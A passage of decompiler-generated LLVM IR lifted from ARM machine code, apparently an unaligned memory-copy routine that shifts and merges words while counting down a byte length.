  %v6_175ec = icmp slt i32 %v1_175ec, 0
  %v2_175f0 = xor i1 %v6_175ec, %v5_175ec
  br i1 %v2_175f0, label %dec_label_pc_175f4.loopexit, label %dec_label_pc_175dc

dec_label_pc_175f4.loopexit:                      ; preds = %dec_label_pc_175dc
  %v7_175ec = icmp eq i32 %v0_175ec, 4
  store i1 %v5_175ec, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_175ec, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_175ec, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_175f4

dec_label_pc_175f4:                               ; preds = %dec_label_pc_175f4.loopexit, %dec_label_pc_175d0
  %v0_1751c59 = phi i32 [ %v1_175ec, %dec_label_pc_175f4.loopexit ], [ %v1_175d4, %dec_label_pc_175d0 ]
  %v0_175f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_175f4 = add i32 %v0_175f4, -3
  store i32 %v1_175f4, i32* @r1, align 4
  br label %bb140

dec_label_pc_175fc:                               ; preds = %dec_label_pc_1757c
  br i1 %v2_17600, label %dec_label_pc_17648, label %dec_label_pc_17604

dec_label_pc_17604:                               ; preds = %dec_label_pc_175fc
  store i32 %v1_175fc, i32* %r2.global-to-local, align 4
  %v3_17608 = load i32, i32* @r4, align 4
  store i32 %v3_17608, i32* %stack_var_-16, align 4
  %v6_17608 = load i32, i32* @r5, align 4
  store i32 %v6_17608, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1760c

dec_label_pc_1760c:                               ; preds = %dec_label_pc_1760c.dec_label_pc_1760c_crit_edge, %dec_label_pc_17604
  %v0_17630 = phi i32 [ %v12_17630, %dec_label_pc_1760c.dec_label_pc_1760c_crit_edge ], [ %v0_1769c76, %dec_label_pc_17604 ]
  %v0_17610 = phi i32 [ %v0_17610.pre, %dec_label_pc_1760c.dec_label_pc_1760c_crit_edge ], [ %v4_17580, %dec_label_pc_17604 ]
  %v0_1760c = phi i32 [ %v0_1760c.pre, %dec_label_pc_1760c.dec_label_pc_1760c_crit_edge ], [ %v2_17580, %dec_label_pc_17604 ]
  %v3_1760c = udiv i32 %v0_1760c, 65536
  %v1_17610 = inttoptr i32 %v0_17610 to i32*
  %v2_17610 = load i32, i32* %v1_17610, align 4
  store i32 %v2_17610, i32* %r4.global-to-local, align 4
  %v3_17610 = add i32 %v0_17610, 4
  %v4_17610 = inttoptr i32 %v3_17610 to i32*
  %v5_17610 = load i32, i32* %v4_17610, align 4
  store i32 %v5_17610, i32* %r5.global-to-local, align 4
  %v6_17610 = add i32 %v0_17610, 8
  %v7_17610 = inttoptr i32 %v6_17610 to i32*
  %v8_17610 = load i32, i32* %v7_17610, align 4
  store i32 %v8_17610, i32* %ip.global-to-local, align 4
  %v9_17610 = add i32 %v0_17610, 12
  %v10_17610 = inttoptr i32 %v9_17610 to i32*
  %v11_17610 = load i32, i32* %v10_17610, align 4
  store i32 %v11_17610, i32* %lr.global-to-local, align 4
  %v12_17610 = add i32 %v0_17610, 16
  store i32 %v12_17610, i32* %r1.global-to-local, align 4
  %v4_17614 = mul i32 %v2_17610, 65536
  %v5_17614 = or i32 %v4_17614, %v3_1760c
  store i32 %v5_17614, i32* @r3, align 4
  %v3_17618 = udiv i32 %v2_17610, 65536
  %v4_1761c = mul i32 %v5_17610, 65536
  %v5_1761c = or i32 %v4_1761c, %v3_17618
  store i32 %v5_1761c, i32* %r4.global-to-local, align 4
  %v3_17620 = udiv i32 %v5_17610, 65536
  %v4_17624 = mul i32 %v8_17610, 65536
  %v5_17624 = or i32 %v4_17624, %v3_17620
  store i32 %v5_17624, i32* %r5.global-to-local, align 4
  %v3_17628 = udiv i32 %v8_17610, 65536
  %v4_1762c = mul i32 %v11_17610, 65536
  %v5_1762c = or i32 %v4_1762c, %v3_17628
  store i32 %v5_1762c, i32* @ip, align 4
  %v1_17630 = inttoptr i32 %v0_17630 to i32*
  store i32 %v5_17614, i32* %v1_17630, align 4
  %v3_17630 = add i32 %v0_17630, 4
  %v4_17630 = inttoptr i32 %v3_17630 to i32*
  %v5_17630 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17630, i32* %v4_17630, align 4
  %v6_17630 = add i32 %v0_17630, 8
  %v7_17630 = inttoptr i32 %v6_17630 to i32*
  %v8_17630 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17630, i32* %v7_17630, align 4
  %v9_17630 = add i32 %v0_17630, 12
  %v10_17630 = inttoptr i32 %v9_17630 to i32*
  %v11_17630 = load i32, i32* @ip, align 4
  store i32 %v11_17630, i32* %v10_17630, align 4
  %v12_17630 = add i32 %v0_17630, 16
  store i32 %v12_17630, i32* @r0, align 4
  %v0_17634 = load i32, i32* %r2.global-to-local, align 4
  %v1_17634 = add i32 %v0_17634, -16
  store i32 %v1_17634, i32* %r2.global-to-local, align 4
  %v3_17634 = sub i32 15, %v0_17634
  %v4_17634 = and i32 %v3_17634, %v0_17634
  %v5_17634 = icmp slt i32 %v4_17634, 0
  %v6_17634 = icmp slt i32 %v1_17634, 0
  %v2_17638 = xor i1 %v6_17634, %v5_17634
  br i1 %v2_17638, label %dec_label_pc_1763c, label %dec_label_pc_1760c.dec_label_pc_1760c_crit_edge

dec_label_pc_1760c.dec_label_pc_1760c_crit_edge:  ; preds = %dec_label_pc_1760c
  %v0_1760c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_17610.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1760c

dec_label_pc_1763c:                               ; preds = %dec_label_pc_1760c
  %v2_1763c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1763c, i32* @r4, align 4
  %v5_1763c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1763c, i32* @r5, align 4
  %v1_17640 = add i32 %v0_17634, -4
  store i32 %v1_17640, i32* %r2.global-to-local, align 4
  %v3_17640 = add i32 %v0_17634, 2147483632
  %v4_17640 = and i32 %v1_17640, %v3_17640
  %v5_17640 = icmp slt i32 %v4_17640, 0
  store i1 %v5_17640, i1* %cpsr_v.global-to-local, align 1
  %v6_17640 = icmp slt i32 %v1_17640, 0
  store i1 %v6_17640, i1* %cpsr_n.global-to-local, align 1
  %v7_17640 = icmp eq i32 %v1_17640, 0
  store i1 %v7_17640, i1* %cpsr_z.global-to-local, align 1
  %v2_17644 = xor i1 %v6_17640, %v5_17640
  br i1 %v2_17644, label %dec_label_pc_17660, label %dec_label_pc_17648

dec_label_pc_17648:                               ; preds = %dec_label_pc_1763c, %dec_label_pc_175fc, %dec_label_pc_17648
  %v1_17654 = phi i32 [ %v4_17654, %dec_label_pc_17648 ], [ %v12_17630, %dec_label_pc_1763c ], [ %v0_1769c76, %dec_label_pc_175fc ]
  %v0_17648 = load i32, i32* %lr.global-to-local, align 4
  %v3_17648 = udiv i32 %v0_17648, 65536
  store i32 %v3_17648, i32* %ip.global-to-local, align 4
  %v0_1764c = load i32, i32* %r1.global-to-local, align 4
  %v1_1764c = inttoptr i32 %v0_1764c to i32*
  %v2_1764c = load i32, i32* %v1_1764c, align 4
  store i32 %v2_1764c, i32* %lr.global-to-local, align 4
  %v4_1764c = add i32 %v0_1764c, 4
  store i32 %v4_1764c, i32* %r1.global-to-local, align 4
  %v4_17650 = mul i32 %v2_1764c, 65536
  %v5_17650 = or i32 %v4_17650, %v3_17648
  store i32 %v5_17650, i32* @ip, align 4
  %v2_17654 = inttoptr i32 %v1_17654 to i32*
  store i32 %v5_17650, i32* %v2_17654, align 4
  %v3_17654 = load i32, i32* @r0, align 4
  %v4_17654 = add i32 %v3_17654, 4
  store i32 %v4_17654, i32* @r0, align 4
  %v0_17658 = load i32, i32* %r2.global-to-local, align 4
  %v1_17658 = add i32 %v0_17658, -4
  store i32 %v1_17658, i32* %r2.global-to-local, align 4
  %v3_17658 = sub i32 3, %v0_17658
  %v4_17658 = and i32 %v3_17658, %v0_17658
  %v5_17658 = icmp slt i32 %v4_17658, 0
  %v6_17658 = icmp slt i32 %v1_17658, 0
  %v2_1765c = xor i1 %v6_17658, %v5_17658
  br i1 %v2_1765c, label %dec_label_pc_17660.loopexit, label %dec_label_pc_17648

dec_label_pc_17660.loopexit:                      ; preds = %dec_label_pc_17648
  %v7_17658 = icmp eq i32 %v0_17658, 4
  store i1 %v5_17658, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_17658, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_17658, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17660

dec_label_pc_17660:                               ; preds = %dec_label_pc_17660.loopexit, %dec_label_pc_1763c
  %v0_1751c60 = phi i32 [ %v1_17658, %dec_label_pc_17660.loopexit ], [ %v1_17640, %dec_label_pc_1763c ]
  %v0_17660 = load i32, i32* %r1.global-to-local, align 4
  %v1_17660 = add i32 %v0_17660, -2
  store i32 %v1_17660, i32* @r1, align 4
  br label %bb140

dec_label_pc_17668:                               ; preds = %dec_label_pc_1757c
  br i1 %v2_17600, label %dec_label_pc_176b4, label %dec_label_pc_17670

dec_label_pc_17670:                               ; preds = %dec_label_pc_17668
  store i32 %v1_175fc, i32* %r2.global-to-local, align 4
  %v3_17674 = load i32, i32* @r4, align 4
  store i32 %v3_17674, i32* %stack_var_-16, align 4
  %v6_17674 = load i32, i32* @r5, align 4
  store i32 %v6_17674, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17678

dec_label_pc_17678:                               ; preds = %dec_label_pc_17678.dec_label_pc_17678_crit_edge, %dec_label_pc_17670
  %v0_1769c = phi i32 [ %v12_1769c, %dec_label_pc_17678.dec_label_pc_17678_crit_edge ], [ %v0_1769c76, %dec_label_pc_17670 ]
  %v0_1767c = phi i32 [ %v0_1767c.pre, %dec_label_pc_17678.dec_label_pc_17678_crit_edge ], [ %v4_17580, %dec_label_pc_17670 ]
  %v0_17678 = phi i32 [ %v0_17678.pre, %dec_label_pc_17678.dec_label_pc_17678_crit_edge ], [ %v2_17580, %dec_label_pc_17670 ]
  %v3_17678 = udiv i32 %v0_17678, 16777216
  %v1_1767c = inttoptr i32 %v0_1767c to i32*
  %v2_1767c = load i32, i32* %v1_1767c, align 4
  store i32 %v2_1767c, i32* %r4.global-to-local, align 4
  %v3_1767c = add i32 %v0_1767c, 4
  %v4_1767c = inttoptr i32 %v3_1767c to i32*
  %v5_1767c = load i32, i32* %v4_1767c, align 4
  store i32 %v5_1767c, i32* %r5.global-to-local, align 4
  %v6_1767c = add i32 %v0_1767c, 8
  %v7_1767c = inttoptr i32 %v6_1767c to i32*
  %v8_1767c = load i32, i32* %v7_1767c, align 4
  store i32 %v8_1767c, i32* %ip.global-to-local, align 4
  %v9_1767c = add i32 %v0_1767c, 12
  %v10_1767c = inttoptr i32 %v9_1767c to i32*
  %v11_1767c = load i32, i32* %v10_1767c, align 4
  store i32 %v11_1767c, i32* %lr.global-to-local, align 4
  %v12_1767c = add i32 %v0_1767c, 16
  store i32 %v12_1767c, i32* %r1.global-to-local, align 4
  %v4_17680 = mul i32 %v2_1767c, 256
  %v5_17680 = or i32 %v4_17680, %v3_17678
  store i32 %v5_17680, i32* @r3, align 4
  %v3_17684 = udiv i32 %v2_1767c, 16777216
  %v4_17688 = mul i32 %v5_1767c, 256
  %v5_17688 = or i32 %v4_17688, %v3_17684
  store i32 %v5_17688, i32* %r4.global-to-local, align 4
  %v3_1768c = udiv i32 %v5_1767c, 16777216
  %v4_17690 = mul i32 %v8_1767c, 256
  %v5_17690 = or i32 %v4_17690, %v3_1768c
  store i32 %v5_17690, i32* %r5.global-to-local, align 4
  %v3_17694 = udiv i32 %v8_1767c, 16777216
  %v4_17698 = mul i32 %v11_1767c, 256
  %v5_17698 = or i32 %v4_17698, %v3_17694
  store i32 %v5_17698, i32* @ip, align 4
  %v1_1769c = inttoptr i32 %v0_1769c to i32*
  store i32 %v5_17680, i32* %v1_1769c, align 4
  %v3_1769c = add i32 %v0_1769c, 4
  %v4_1769c = inttoptr i32 %v3_1769c to i32*
  %v5_1769c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1769c, i32* %v4_1769c, align 4
  %v6_1769c = add i32 %v0_1769c, 8
  %v7_1769c = inttoptr i32 %v6_1769c to i32*
  %v8_1769c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1769c, i32* %v7_1769c, align 4
  %v9_1769c = add i32 %v0_1769c, 12
  %v10_1769c = inttoptr i32 %v9_1769c to i32*
  %v11_1769c = load i32, i32* @ip, align 4
  store i32 %v11_1769c, i32* %v10_1769c, align 4
  %v12_1769c = add i32 %v0_1769c, 16
  store i32 %v12_1769c, i32* @r0, align 4
  %v0_176a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_176a0 = add i32 %v0_176a0, -16
  store i32 %v1_176a0, i32* %r2.global-to-local, align 4
  %v3_176a0 = sub i32 15, %v0_176a0
  %v4_176a0 = and i32 %v3_176a0, %v0_176a0
  %v5_176a0 = icmp slt i32 %v4_176a0, 0
  %v6_176a0 = icmp slt i32 %v1_176a0, 0
  %v2_176a4 = xor i1 %v6_176a0, %v5_176a0
  br i1 %v2_176a4, label %dec_label_pc_176a8, label %dec_label_pc_17678.dec_label_pc_17678_crit_edge

dec_label_pc_17678.dec_label_pc_17678_crit_edge:  ; preds = %dec_label_pc_17678
  %v0_17678.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1767c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17678

dec_label_pc_176a8:                               ; preds = %dec_label_pc_17678
  %v2_176a8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_176a8, i32* @r4, align 4
  %v5_176a8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_176a8, i32* @r5, align 4
  %v1_176ac = add i32 %v0_176a0, -4
  store i32 %v1_176ac, i32* %r2.global-to-local, align 4
  %v3_176ac = add i32 %v0_176a0, 2147483632
  %v4_176ac = and i32 %v1_176ac, %v3_176ac
  %v5_176ac = icmp slt i32 %v4_176ac, 0
  store i1 %v5_176ac, i1* %cpsr_v.global-to-local, align 1
  %v6_176ac = icmp slt i32 %v1_176ac, 0
  store i1 %v6_176ac, i1* %cpsr_n.global-to-local, align 1
  %v7_176ac = icmp eq i32 %v1_176ac, 0
  store i1 %v7_176ac, i1* %cpsr_z.global-to-local, align 1
  %v2_176b0 = xor i1 %v6_176ac, %v5_176ac
  br i1 %v2_176b0, label %dec_label_pc_176cc, label %dec_label_pc_176b4

dec_label_pc_176b4:                               ; preds = %dec_label_pc_176a8, %dec_label_pc_17668, %dec_label_pc_176b4
  %v1_176c0 = phi i32 [ %v4_176c0, %dec_label_pc_176b4 ], [ %v12_1769c, %dec_label_pc_176a8 ], [ %v0_1769c76, %dec_label_pc_17668 ]
  %v0_176b4 = load i32, i32* %lr.global-to-local, align 4
  %v3_176b4 = udiv i32 %v0_176b4, 16777216
  store i32 %v3_176b4, i32* %ip.global-to-local, align 4
  %v0_176b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_176b8 = inttoptr i32 %v0_176b8 to i32*
  %v2_176b8 = load i32, i32* %v1_176b8, align 4
  store i32 %v2_176b8, i32* %lr.global-to-local, align 4
  %v4_176b8 = add i32 %v0_176b8, 4
  store i32 %v4_176b8, i32* %r1.global-to-local, align 4
  %v4_176bc = mul i32 %v2_176b8, 256
  %v5_176bc = or i32 %v4_176bc, %v3_176b4
  store i32 %v5_176bc, i32* @ip, align 4
  %v2_176c0 = inttoptr i32 %v1_176c0 to i32*
  store i32 %v5_176bc, i32* %v2_176c0, align 4
  %v3_176c0 = load i32, i32* @r0, align 4
  %v4_176c0 = add i32 %v3_176c0, 4
  store i32 %v4_176c0, i32* @r0, align 4
  %v0_176c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_176c4 = add i32 %v0_176c4, -4
  store i32 %v1_176c4, i32* %r2.global-to-local, align 4
  %v3_176c4 = sub i32 3, %v0_176c4
  %v4_176c4 = and i32 %v3_176c4, %v0_176c4
  %v5_176c4 = icmp slt i32 %v4_176c4, 0
  %v6_176c4 = icmp slt i32 %v1_176c4, 0
  %v2_176c8 = xor i1 %v6_176c4, %v5_176c4
  br i1 %v2_176c8, label %dec_label_pc_176cc.loopexit, label %dec_label_pc_176b4

dec_label_pc_176cc.loopexit:                      ; preds = %dec_label_pc_176b4
  %v7_176c4 = icmp eq i32 %v0_176c4, 4
  store i1 %v5_176c4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_176c4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_176c4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_176cc

dec_label_pc_176cc:                               ; preds = %dec_label_pc_176cc.loopexit, %dec_label_pc_176a8
  %v0_1751c61 = phi i32 [ %v1_176c4, %dec_label_pc_176cc.loopexit ], [ %v1_176ac, %dec_label_pc_176a8 ]
  %v0_176cc = load i32, i32* %r1.global-to-local, align 4
  %v1_176cc = add i32 %v0_176cc, -1
  store i32 %v1_176cc, i32* @r1, align 4
  br label %bb140

dec_label_pc_176d4:                               ; preds = %dec_label_pc_17480
  %v1_176d4 = load i32, i32* @r2, align 4
  %v2_176d4 = add i32 %v1_176d4, %v0_17480
  store i32 %v2_176d4, i32* %r1.global-to-local, align 4
  %v2_176d8 = add i32 %v1_176d4, %v1_17480
  store i32 %v2_176d8, i32* %r0.global-to-local, align 4
  %v2_176dc = add i32 %v1_176d4, -4
  store i32 %v2_176dc, i32* %r2.global-to-local, align 4
  %v4_176dc = sub i32 3, %v1_176d4
  %v5_176dc = and i32 %v4_176dc, %v1_176d4
  %v6_176dc = icmp slt i32 %v5_176dc, 0
  store i1 %v6_176dc, i1* %cpsr_v.global-to-local, align 1
  %v7_176dc = icmp slt i32 %v2_176dc, 0
  store i1 %v7_176dc, i1* %cpsr_n.global-to-local, align 1
  %v8_176dc = icmp eq i32 %v1_176d4, 4
  store i1 %v8_176dc, i1* %cpsr_z.global-to-local, align 1
  %v5_176e0 = icmp slt i32 %v1_176d4, 4
  br i1 %v5_176e0, label %bb150, label %dec_label_pc_176e4

dec_label_pc_176e4:                               ; preds = %dec_label_pc_176d4
  %v1_176e4 = urem i32 %v2_176d8, 4
  store i32 %v1_176e4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_176e4 = icmp eq i32 %v1_176e4, 0
  store i1 %v2_176e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_176e4, label %dec_label_pc_176ec, label %dec_label_pc_1778c

dec_label_pc_176ec:                               ; preds = %dec_label_pc_176e4
  %v1_176ec = urem i32 %v2_176d4, 4
  store i32 %v1_176ec, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_176ec = icmp eq i32 %v1_176ec, 0
  store i1 %v2_176ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_176ec, label %dec_label_pc_176f4, label %dec_label_pc_177b8

dec_label_pc_176f4:                               ; preds = %dec_label_pc_176ec, %dec_label_pc_177b0
  %v0_1770c37 = phi i32 [ %v2_176d8, %dec_label_pc_176ec ], [ %v0_1780020, %dec_label_pc_177b0 ]
  %v0_1770836 = phi i32 [ %v2_176d4, %dec_label_pc_176ec ], [ %v0_177b0, %dec_label_pc_177b0 ]
  %v0_176f4 = phi i32 [ %v2_176dc, %dec_label_pc_176ec ], [ %v2_177a8, %dec_label_pc_177b0 ]
  %v2_176f4 = add i32 %v0_176f4, -8
  store i32 %v2_176f4, i32* %r2.global-to-local, align 4
  %v4_176f4 = sub i32 7, %v0_176f4
  %v5_176f4 = and i32 %v4_176f4, %v0_176f4
  %v6_176f4 = icmp slt i32 %v5_176f4, 0
  store i1 %v6_176f4, i1* %cpsr_v.global-to-local, align 1
  %v7_176f4 = icmp slt i32 %v2_176f4, 0
  store i1 %v7_176f4, i1* %cpsr_n.global-to-local, align 1
  %v8_176f4 = icmp eq i32 %v0_176f4, 8
  store i1 %v8_176f4, i1* %cpsr_z.global-to-local, align 1
  %v5_176f8 = icmp slt i32 %v0_176f4, 8
  br i1 %v5_176f8, label %dec_label_pc_17744, label %dec_label_pc_176fc

dec_label_pc_176fc:                               ; preds = %dec_label_pc_176f4
  %v3_176fc = load i32, i32* @r4, align 4
  %v5_176fc = inttoptr i32 %v3_176fc to i8*
  store i8* %v5_176fc, i8** %stack_var_-8, align 4
  %v8_176fc = load i32, i32* @lr, align 4
  %v2_17700 = add i32 %v0_176f4, -28
  store i32 %v2_17700, i32* %r2.global-to-local, align 4
  %v4_17700 = sub i32 27, %v0_176f4
  %v5_17700 = and i32 %v4_17700, %v2_176f4
  %v6_17700 = icmp slt i32 %v5_17700, 0
  store i1 %v6_17700, i1* %cpsr_v.global-to-local, align 1
  %v7_17700 = icmp slt i32 %v2_17700, 0
  store i1 %v7_17700, i1* %cpsr_n.global-to-local, align 1
  %v8_17700 = icmp eq i32 %v2_176f4, 20
  store i1 %v8_17700, i1* %cpsr_z.global-to-local, align 1
  %v5_17704 = icmp slt i32 %v2_176f4, 20
  br i1 %v5_17704, label %dec_label_pc_17720, label %dec_label_pc_17708

dec_label_pc_17708:                               ; preds = %dec_label_pc_176fc, %dec_label_pc_17708.dec_label_pc_17708_crit_edge
  %v0_1770c = phi i32 [ %v1_17714, %dec_label_pc_17708.dec_label_pc_17708_crit_edge ], [ %v0_1770c37, %dec_label_pc_176fc ]
  %v0_17708 = phi i32 [ %v0_17708.pre, %dec_label_pc_17708.dec_label_pc_17708_crit_edge ], [ %v0_1770836, %dec_label_pc_176fc ]
  %v1_17708 = add i32 %v0_17708, -4
  %v2_17708 = inttoptr i32 %v1_17708 to i32*
  %v3_17708 = load i32, i32* %v2_17708, align 4
  %v4_17708 = add i32 %v0_17708, -8
  %v5_17708 = inttoptr i32 %v4_17708 to i32*
  %v6_17708 = load i32, i32* %v5_17708, align 4
  store i32 %v6_17708, i32* %r4.global-to-local, align 4
  %v7_17708 = add i32 %v0_17708, -12
  %v8_17708 = inttoptr i32 %v7_17708 to i32*
  %v9_17708 = load i32, i32* %v8_17708, align 4
  store i32 %v9_17708, i32* %ip.global-to-local, align 4
  %v10_17708 = add i32 %v0_17708, -16
  %v11_17708 = inttoptr i32 %v10_17708 to i32*
  %v12_17708 = load i32, i32* %v11_17708, align 4
  store i32 %v12_17708, i32* %lr.global-to-local, align 4
  store i32 %v10_17708, i32* %r1.global-to-local, align 4
  %v1_1770c = add i32 %v0_1770c, -16
  %v2_1770c = inttoptr i32 %v1_1770c to i32*
  store i32 %v3_17708, i32* %v2_1770c, align 4
  %v4_1770c = add i32 %v0_1770c, -12
  %v5_1770c = inttoptr i32 %v4_1770c to i32*
  %v6_1770c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1770c, i32* %v5_1770c, align 4
  %v7_1770c = add i32 %v0_1770c, -8
  %v8_1770c = inttoptr i32 %v7_1770c to i32*
  %v9_1770c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1770c, i32* %v8_1770c, align 4
  %v10_1770c = add i32 %v0_1770c, -4
  %v11_1770c = inttoptr i32 %v10_1770c to i32*
  %v12_1770c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1770c, i32* %v11_1770c, align 4
  store i32 %v1_1770c, i32* %r0.global-to-local, align 4
  %v0_17710 = load i32, i32* %r1.global-to-local, align 4
  %v1_17710 = add i32 %v0_17710, -4
  %v2_17710 = inttoptr i32 %v1_17710 to i32*
  %v3_17710 = load i32, i32* %v2_17710, align 4
  store i32 %v3_17710, i32* @r3, align 4
  %v4_17710 = add i32 %v0_17710, -8
  %v5_17710 = inttoptr i32 %v4_17710 to i32*
  %v6_17710 = load i32, i32* %v5_17710, align 4
  store i32 %v6_17710, i32* %r4.global-to-local, align 4
  %v7_17710 = add i32 %v0_17710, -12
  %v8_17710 = inttoptr i32 %v7_17710 to i32*
  %v9_17710 = load i32, i32* %v8_17710, align 4
  store i32 %v9_17710, i32* @ip, align 4
  %v10_17710 = add i32 %v0_17710, -16
  %v11_17710 = inttoptr i32 %v10_17710 to i32*
  %v12_17710 = load i32, i32* %v11_17710, align 4
  store i32 %v12_17710, i32* %lr.global-to-local, align 4
  store i32 %v10_17710, i32* %r1.global-to-local, align 4
  %v1_17714 = add i32 %v0_1770c, -32
  %v2_17714 = inttoptr i32 %v1_17714 to i32*
  store i32 %v3_17710, i32* %v2_17714, align 4
  %v4_17714 = add i32 %v0_1770c, -28
  %v5_17714 = inttoptr i32 %v4_17714 to i32*
  %v6_17714 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_17714, i32* %v5_17714, align 4
  %v7_17714 = add i32 %v0_1770c, -24
  %v8_17714 = inttoptr i32 %v7_17714 to i32*
  %v9_17714 = load i32, i32* @ip, align 4
  store i32 %v9_17714, i32* %v8_17714, align 4
  %v10_17714 = add i32 %v0_1770c, -20
  %v11_17714 = inttoptr i32 %v10_17714 to i32*
  %v12_17714 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17714, i32* %v11_17714, align 4
  store i32 %v1_17714, i32* %r0.global-to-local, align 4
  %v0_17718 = load i32, i32* %r2.global-to-local, align 4
  %v2_17718 = add i32 %v0_17718, -32
  store i32 %v2_17718, i32* %r2.global-to-local, align 4
  %v6_1771c = icmp slt i32 %v0_17718, 32
  br i1 %v6_1771c, label %dec_label_pc_17720.loopexit, label %dec_label_pc_17708.dec_label_pc_17708_crit_edge

dec_label_pc_17708.dec_label_pc_17708_crit_edge:  ; preds = %dec_label_pc_17708
  %v0_17708.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17708

dec_label_pc_17720.loopexit:                      ; preds = %dec_label_pc_17708
  %v4_17718 = sub i32 31, %v0_17718
  %v5_17718 = and i32 %v4_17718, %v0_17718
  %v6_17718 = icmp slt i32 %v5_17718, 0
  %v7_17718 = icmp slt i32 %v2_17718, 0
  store i1 %v6_17718, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17718, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17720

dec_label_pc_17720:                               ; preds = %dec_label_pc_17720.loopexit, %dec_label_pc_176fc
  %v6_17728 = phi i32 [ %v1_17714, %dec_label_pc_17720.loopexit ], [ %v0_1770c37, %dec_label_pc_176fc ]
  %v0_17730.pr = phi i32 [ %v2_17718, %dec_label_pc_17720.loopexit ], [ %v2_17700, %dec_label_pc_176fc ]
  %v4_17720 = add i32 %v0_17730.pr, 16
  %v6_17720 = sub i32 0, %v0_17730.pr
  %v7_17720 = and i32 %v4_17720, %v6_17720
  %v8_17720 = icmp slt i32 %v7_17720, 0
  store i1 %v8_17720, i1* %cpsr_v.global-to-local, align 1
  %v9_17720 = icmp slt i32 %v4_17720, 0
  store i1 %v9_17720, i1* %cpsr_n.global-to-local, align 1
  %v10_17720 = icmp eq i32 %v4_17720, 0
  store i1 %v10_17720, i1* %cpsr_z.global-to-local, align 1
  %v5_17724 = icmp slt i32 %v0_17730.pr, -16
  br i1 %v5_17724, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_17720
  %v6_17724 = load i32, i32* %r1.global-to-local, align 4
  %v7_17724 = add i32 %v6_17724, -4
  %v8_17724 = inttoptr i32 %v7_17724 to i32*
  %v9_17724 = load i32, i32* %v8_17724, align 4
  store i32 %v9_17724, i32* @r3, align 4
  %v10_17724 = add i32 %v6_17724, -8
  %v11_17724 = inttoptr i32 %v10_17724 to i32*
  %v12_17724 = load i32, i32* %v11_17724, align 4
  store i32 %v12_17724, i32* %r4.global-to-local, align 4
  %v13_17724 = add i32 %v6_17724, -12
  %v14_17724 = inttoptr i32 %v13_17724 to i32*
  %v15_17724 = load i32, i32* %v14_17724, align 4
  store i32 %v15_17724, i32* @ip, align 4
  %v16_17724 = add i32 %v6_17724, -16
  %v17_17724 = inttoptr i32 %v16_17724 to i32*
  %v18_17724 = load i32, i32* %v17_17724, align 4
  store i32 %v18_17724, i32* %lr.global-to-local, align 4
  store i32 %v16_17724, i32* %r1.global-to-local, align 4
  %v7_17728 = add i32 %v6_17728, -16
  %v8_17728 = inttoptr i32 %v7_17728 to i32*
  store i32 %v9_17724, i32* %v8_17728, align 4
  %v10_17728 = add i32 %v6_17728, -12
  %v11_17728 = inttoptr i32 %v10_17728 to i32*
  %v12_17728 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_17728, i32* %v11_17728, align 4
  %v13_17728 = add i32 %v6_17728, -8
  %v14_17728 = inttoptr i32 %v13_17728 to i32*
  %v15_17728 = load i32, i32* @ip, align 4
  store i32 %v15_17728, i32* %v14_17728, align 4
  %v16_17728 = add i32 %v6_17728, -4
  %v17_17728 = inttoptr i32 %v16_17728 to i32*
  %v18_17728 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_17728, i32* %v17_17728, align 4
  store i32 %v7_17728, i32* %r0.global-to-local, align 4
  %v6_1772c = load i32, i32* %r2.global-to-local, align 4
  %v7_1772c = add i32 %v6_1772c, -16
  store i32 %v7_1772c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17720, %bb147
  %v6_17738 = phi i32 [ %v7_17728, %bb147 ], [ %v6_17728, %dec_label_pc_17720 ]
  %v0_17730 = phi i32 [ %v7_1772c, %bb147 ], [ %v0_17730.pr, %dec_label_pc_17720 ]
  %v4_17730 = add i32 %v0_17730, 20
  store i32 %v4_17730, i32* %r2.global-to-local, align 4
  %v6_17730 = sub i32 0, %v0_17730
  %v7_17730 = and i32 %v4_17730, %v6_17730
  %v8_17730 = icmp slt i32 %v7_17730, 0
  store i1 %v8_17730, i1* %cpsr_v.global-to-local, align 1
  %v9_17730 = icmp slt i32 %v4_17730, 0
